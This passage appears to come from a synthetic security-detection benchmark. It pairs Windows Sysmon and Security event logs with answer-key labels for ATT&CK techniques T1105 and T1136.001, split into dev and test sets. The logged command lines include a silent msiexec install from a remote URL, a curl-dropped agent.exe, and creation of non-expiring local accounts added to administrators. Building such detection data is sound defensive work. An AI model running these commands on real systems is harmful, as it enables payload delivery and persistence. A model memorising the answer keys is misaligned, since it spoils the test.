    "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
    "ProcessId": 75836,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.10",
    "SourcePort": 63712,
    "User": "agarcia",
    "UtcTime": "2026-01-23T09:29:06Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\curl.exe",
    "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
    "ProcessId": 75836,
    "TargetFilename": "C:\\ProgramData\\oak_beech_aspen_0836c4\\agent.exe",
    "User": "agarcia",
    "UtcTime": "2026-01-23T09:29:09Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_D/contextual",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_70e7bfd7",
        "fields": [
          "Computer",
          "DestinationPort",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_ca1ffffa",
        "fields": [
          "CommandLine",
          "Computer",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_4ea42387",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process-creation record contains download syntax, and a related file event records a local file at the requested destination.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_3b5f21e8"
}
```

## pair_81971e41
Family: TF_T1105_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_06b63b66",
    "event_record_id": 245316035267201,
    "fields": {
      "CommandLine": "msiexec.exe /i https://files.example.invalid/aspen_beech_fir_81971e/setup.msi /qn",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=2edd59eec6b2c8f9cf67b6a28309e487373a2441816b903dc27b3a6daa1481c5",
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "LogonGuid": "{1ee6617e-3fac-e9df-fab0-6074db4e43fe}",
      "LogonId": "0x30ad",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{1b27de9e-05ac-a91c-0003-6d5d17bd2ff8}",
      "ParentProcessId": 12456,
      "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
      "ProcessId": 12460,
      "User": "tjones",
      "UtcTime": "2026-02-06T04:27:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-06T04:27:36Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "msiexec.exe /i https://files.example.invalid/aspen_beech_fir_81971e/setup.msi /qn",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=2edd59eec6b2c8f9cf67b6a28309e487373a2441816b903dc27b3a6daa1481c5",
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "LogonGuid": "{1ee6617e-3fac-e9df-fab0-6074db4e43fe}",
    "LogonId": "0x30ad",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{1b27de9e-05ac-a91c-0003-6d5d17bd2ff8}",
    "ParentProcessId": 12456,
    "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
    "ProcessId": 12460,
    "User": "tjones",
    "UtcTime": "2026-02-06T04:27:36Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_DEV/single",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_06b63b66",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only msi transfer initiated by msiexec with a remote package url has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_463e86ed"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_06b63b66",
    "event_record_id": 245316035267201,
    "fields": {
      "CommandLine": "msiexec.exe /i https://files.example.invalid/aspen_beech_fir_81971e/setup.msi /qn",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=2edd59eec6b2c8f9cf67b6a28309e487373a2441816b903dc27b3a6daa1481c5",
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "LogonGuid": "{1ee6617e-3fac-e9df-fab0-6074db4e43fe}",
      "LogonId": "0x30ad",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{1b27de9e-05ac-a91c-0003-6d5d17bd2ff8}",
      "ParentProcessId": 12456,
      "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
      "ProcessId": 12460,
      "User": "tjones",
      "UtcTime": "2026-02-06T04:27:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-06T04:27:36Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_42d1516f",
    "event_record_id": 33961448712709,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
      "ProcessId": 12460,
      "TargetFilename": "C:\\ProgramData\\aspen_beech_fir_81971e\\setup.msi",
      "User": "tjones",
      "UtcTime": "2026-02-06T04:27:39Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-06T04:27:39Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "msiexec.exe /i https://files.example.invalid/aspen_beech_fir_81971e/setup.msi /qn",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=2edd59eec6b2c8f9cf67b6a28309e487373a2441816b903dc27b3a6daa1481c5",
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "LogonGuid": "{1ee6617e-3fac-e9df-fab0-6074db4e43fe}",
    "LogonId": "0x30ad",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{1b27de9e-05ac-a91c-0003-6d5d17bd2ff8}",
    "ParentProcessId": 12456,
    "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
    "ProcessId": 12460,
    "User": "tjones",
    "UtcTime": "2026-02-06T04:27:36Z"
  },
  {
    "Computer": "FILESVR01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "ProcessGuid": "{df1d1723-ca81-7f96-56b3-9941eb74d77b}",
    "ProcessId": 12460,
    "TargetFilename": "C:\\ProgramData\\aspen_beech_fir_81971e\\setup.msi",
    "User": "tjones",
    "UtcTime": "2026-02-06T04:27:39Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_DEV/contextual",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_06b63b66",
        "fields": [
          "CommandLine",
          "Computer",
          "Image"
        ]
      },
      {
        "event_id": "evt_42d1516f",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only msi transfer initiated by msiexec with a remote package url behavior through a related telemetry event.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_67695d99"
}
```

## pair_03f51863
Family: TF_T1136_001_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_0978dbd8",
    "event_record_id": 275613301714538,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net user svc_03f518$ ExamplePassword! /add /expires:never",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x3afc",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x3af8",
      "SubjectLogonId": "0x3afd",
      "SubjectUserName": "tjones",
      "TargetUserName": "tjones",
      "TimeCreated": "2026-02-12T11:29:38Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-12T11:29:38Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net user svc_03f518$ ExamplePassword! /add /expires:never",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x3afc",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x3af8",
    "SubjectLogonId": "0x3afd",
    "SubjectUserName": "tjones",
    "TargetUserName": "tjones",
    "TimeCreated": "2026-02-12T11:29:38Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_A/single",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_0978dbd8",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process event visibly records creation of a local account through net user with persistence-oriented account parameters.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_683943c0"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_0978dbd8",
    "event_record_id": 275613301714538,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net user svc_03f518$ ExamplePassword! /add /expires:never",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x3afc",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x3af8",
      "SubjectLogonId": "0x3afd",
      "SubjectUserName": "tjones",
      "TargetUserName": "tjones",
      "TimeCreated": "2026-02-12T11:29:38Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-12T11:29:38Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_64eb1218",
    "event_record_id": 65127257107171,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4720,
      "SubjectLogonId": "0x3afd",
      "SubjectUserName": "tjones",
      "TargetUserName": "svc_03f518$",
      "TimeCreated": "2026-02-12T11:29:41Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-12T11:29:41Z",
    "windows_event_id": 4720
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net user svc_03f518$ ExamplePassword! /add /expires:never",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x3afc",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x3af8",
    "SubjectLogonId": "0x3afd",
    "SubjectUserName": "tjones",
    "TargetUserName": "tjones",
    "TimeCreated": "2026-02-12T11:29:38Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 4720,
    "SubjectLogonId": "0x3afd",
    "SubjectUserName": "tjones",
    "TargetUserName": "svc_03f518$",
    "TimeCreated": "2026-02-12T11:29:41Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_A/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_0978dbd8",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName"
        ]
      },
      {
        "event_id": "evt_64eb1218",
        "fields": [
          "Computer",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The contextual account-created event links the net user command to the created local account.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_b632ec12"
}
```

## pair_0306bd7c
Family: TF_T1136_001_B; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_bef1d7dc",
    "event_record_id": 188629633045882,
    "fields": {
      "Computer": "APPSVR01",
      "EventID": 4720,
      "SubjectLogonId": "0xb8b1",
      "SubjectUserName": "jsmith",
      "TargetUserName": "svc_0306bd",
      "TimeCreated": "2026-05-14T12:28:26Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-14T12:28:26Z",
    "windows_event_id": 4720
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "EventID": 4720,
    "SubjectLogonId": "0xb8b1",
    "SubjectUserName": "jsmith",
    "TargetUserName": "svc_0306bd",
    "TimeCreated": "2026-05-14T12:28:26Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_bef1d7dc",
        "fields": [
          "SubjectUserName",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 4720 proves account creation but the account name and creator alone do not establish adversarial intent.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_6ca985a0"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_bef1d7dc",
    "event_record_id": 188629633045882,
    "fields": {
      "Computer": "APPSVR01",
      "EventID": 4720,
      "SubjectLogonId": "0xb8b1",
      "SubjectUserName": "jsmith",
      "TargetUserName": "svc_0306bd",
      "TimeCreated": "2026-05-14T12:28:26Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-14T12:28:26Z",
    "windows_event_id": 4720
  },
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_3d506a3f",
    "event_record_id": 278770550598948,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators svc_0306bd /add",
      "Computer": "APPSVR01",
      "EventID": 4688,
      "NewProcessId": "0xb8b4",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0xb8ac",
      "SubjectLogonId": "0xb8b1",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-05-14T12:28:29Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-14T12:28:29Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "EventID": 4720,
    "SubjectLogonId": "0xb8b1",
    "SubjectUserName": "jsmith",
    "TargetUserName": "svc_0306bd",
    "TimeCreated": "2026-05-14T12:28:26Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators svc_0306bd /add",
    "Computer": "APPSVR01",
    "EventID": 4688,
    "NewProcessId": "0xb8b4",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0xb8ac",
    "SubjectLogonId": "0xb8b1",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-05-14T12:28:29Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_B/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_bef1d7dc",
        "fields": [
          "SubjectUserName",
          "TargetUserName"
        ]
      },
      {
        "event_id": "evt_3d506a3f",
        "fields": [
          "CommandLine",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The account creation is linked to immediate privileged-group use by the same creator session, providing contextual evidence for local-account abuse.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_2de8bb85"
}
```

## pair_03672e31
Family: TF_T1136_001_C; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_62196b54",
    "event_record_id": 280445695808888,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_03672e -AccountNeverExpires -Description fir_ash_larch_03672e\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{d733464a-6d27-dbb6-3fcb-ac48c28e90d5}",
      "LogonId": "0x10ec9",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{f5fbee96-81ce-9e35-b440-f6776f5daa1b}",
      "ParentProcessId": 69316,
      "ProcessGuid": "{ff105a13-d578-e29c-81cb-a13ea71ac000}",
      "ProcessId": 69320,
      "User": "agarcia",
      "UtcTime": "2026-02-19T08:55:54Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-19T08:55:54Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_03672e -AccountNeverExpires -Description fir_ash_larch_03672e\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{d733464a-6d27-dbb6-3fcb-ac48c28e90d5}",
    "LogonId": "0x10ec9",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{f5fbee96-81ce-9e35-b440-f6776f5daa1b}",
    "ParentProcessId": 69316,
    "ProcessGuid": "{ff105a13-d578-e29c-81cb-a13ea71ac000}",
    "ProcessId": 69320,
    "User": "agarcia",
    "UtcTime": "2026-02-19T08:55:54Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_C/single",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_62196b54",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The PowerShell process command line explicitly invokes New-LocalUser with a persistence-oriented option.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_02aac5b1"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_62196b54",
    "event_record_id": 280445695808888,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_03672e -AccountNeverExpires -Description fir_ash_larch_03672e\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{d733464a-6d27-dbb6-3fcb-ac48c28e90d5}",
      "LogonId": "0x10ec9",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{f5fbee96-81ce-9e35-b440-f6776f5daa1b}",
      "ParentProcessId": 69316,
      "ProcessGuid": "{ff105a13-d578-e29c-81cb-a13ea71ac000}",
      "ProcessId": 69320,
      "User": "agarcia",
      "UtcTime": "2026-02-19T08:55:54Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-19T08:55:54Z",
    "windows_event_id": 1
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_91c65b56",
    "event_record_id": 233021828752877,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4720,
      "SubjectLogonId": "0x10ec9",
      "SubjectUserName": "agarcia",
      "TargetUserName": "svc_03672e",
      "TimeCreated": "2026-02-19T08:55:57Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-19T08:55:57Z",
    "windows_event_id": 4720
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_03672e -AccountNeverExpires -Description fir_ash_larch_03672e\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{d733464a-6d27-dbb6-3fcb-ac48c28e90d5}",
    "LogonId": "0x10ec9",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{f5fbee96-81ce-9e35-b440-f6776f5daa1b}",
    "ParentProcessId": 69316,
    "ProcessGuid": "{ff105a13-d578-e29c-81cb-a13ea71ac000}",
    "ProcessId": 69320,
    "User": "agarcia",
    "UtcTime": "2026-02-19T08:55:54Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 4720,
    "SubjectLogonId": "0x10ec9",
    "SubjectUserName": "agarcia",
    "TargetUserName": "svc_03672e",
    "TimeCreated": "2026-02-19T08:55:57Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_C/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_62196b54",
        "fields": [
          "CommandLine",
          "Computer",
          "Image"
        ]
      },
      {
        "event_id": "evt_91c65b56",
        "fields": [
          "Computer",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The contextual 4720 record links the PowerShell provisioning command to the created local account.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_f900432e"
}
```

## pair_4bc4947a
Family: TF_T1136_001_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_a0d91b0d",
    "event_record_id": 279731938851356,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_4bc494 -AccountNeverExpires -Description willow_oak_fir_4bc494\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{8c0fe08f-b7ce-d320-2920-0b42715f4440}",
      "LogonId": "0x6d2d",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{ecb74242-bcef-a251-d573-d3c6d7c77fe7}",
      "ParentProcessId": 27944,
      "ProcessGuid": "{fe6a2ad8-fa1c-06df-24b0-cf0e12eefb73}",
      "ProcessId": 27948,
      "User": "mchen",
      "UtcTime": "2026-06-28T17:59:52Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-28T17:59:52Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_4bc494 -AccountNeverExpires -Description willow_oak_fir_4bc494\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{8c0fe08f-b7ce-d320-2920-0b42715f4440}",
    "LogonId": "0x6d2d",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{ecb74242-bcef-a251-d573-d3c6d7c77fe7}",
    "ParentProcessId": 27944,
    "ProcessGuid": "{fe6a2ad8-fa1c-06df-24b0-cf0e12eefb73}",
    "ProcessId": 27948,
    "User": "mchen",
    "UtcTime": "2026-06-28T17:59:52Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_DEV/single",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_a0d91b0d",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only powershell core creates a local service account during member-server provisioning has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_764fd414"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_a0d91b0d",
    "event_record_id": 279731938851356,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_4bc494 -AccountNeverExpires -Description willow_oak_fir_4bc494\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{8c0fe08f-b7ce-d320-2920-0b42715f4440}",
      "LogonId": "0x6d2d",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{ecb74242-bcef-a251-d573-d3c6d7c77fe7}",
      "ParentProcessId": 27944,
      "ProcessGuid": "{fe6a2ad8-fa1c-06df-24b0-cf0e12eefb73}",
      "ProcessId": 27948,
      "User": "mchen",
      "UtcTime": "2026-06-28T17:59:52Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-28T17:59:52Z",
    "windows_event_id": 1
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_766b718c",
    "event_record_id": 181589864695400,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4720,
      "SubjectLogonId": "0x6d2d",
      "SubjectUserName": "mchen",
      "TargetUserName": "svc_4bc494",
      "TimeCreated": "2026-06-28T17:59:55Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-28T17:59:55Z",
    "windows_event_id": 4720
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command \"New-LocalUser -Name svc_4bc494 -AccountNeverExpires -Description willow_oak_fir_4bc494\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{8c0fe08f-b7ce-d320-2920-0b42715f4440}",
    "LogonId": "0x6d2d",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{ecb74242-bcef-a251-d573-d3c6d7c77fe7}",
    "ParentProcessId": 27944,
    "ProcessGuid": "{fe6a2ad8-fa1c-06df-24b0-cf0e12eefb73}",
    "ProcessId": 27948,
    "User": "mchen",
    "UtcTime": "2026-06-28T17:59:52Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 4720,
    "SubjectLogonId": "0x6d2d",
    "SubjectUserName": "mchen",
    "TargetUserName": "svc_4bc494",
    "TimeCreated": "2026-06-28T17:59:55Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_DEV/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_a0d91b0d",
